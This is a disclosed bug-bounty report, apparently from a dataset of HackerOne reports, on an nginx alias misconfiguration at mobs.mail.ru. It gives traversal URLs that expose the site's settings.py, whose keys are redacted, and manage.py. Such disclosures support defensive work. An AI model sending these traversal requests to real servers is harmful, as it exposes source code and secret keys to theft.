---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '312510'
original_report_id: '312510'
title: '[mobs.mail.ru] nginx path traversal via misconfigured alias'
weakness: Information Disclosure
team_handle: mailru
created_at: '2018-02-05T12:23:11.628Z'
disclosed_at: '2018-05-22T15:09:32.612Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 18
asset_identifier: '*.mail.ru / Mail.Ru - another project (except subdomains delegated
  to external entities)'
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# [mobs.mail.ru] nginx path traversal via misconfigured alias

## Metadata

- HackerOne Report ID: 312510
- Weakness: Information Disclosure
- Program: mailru
- Disclosed At: 2018-05-22T15:09:32.612Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Domain, site, application
--
mobs.mail.ru

Steps to reproduce
--
```
http://mobs.mail.ru/media../mobs/settings.py
```

Actual results
--
```py
...
SECRET_KEY = '████████████'
...
DISTIMO_PRIVATE_KEY = '████████████'
...
```

PoC, exploit code, screenshots, video, references, additional resources
--
```
http://mobs.mail.ru/media../mobs/settings.py
http://mobs.mail.ru/media../manage.py
```

[alias_traversal] Path traversal via misconfigured alias
https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md

## Impact

Source code and configuration disclosure

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
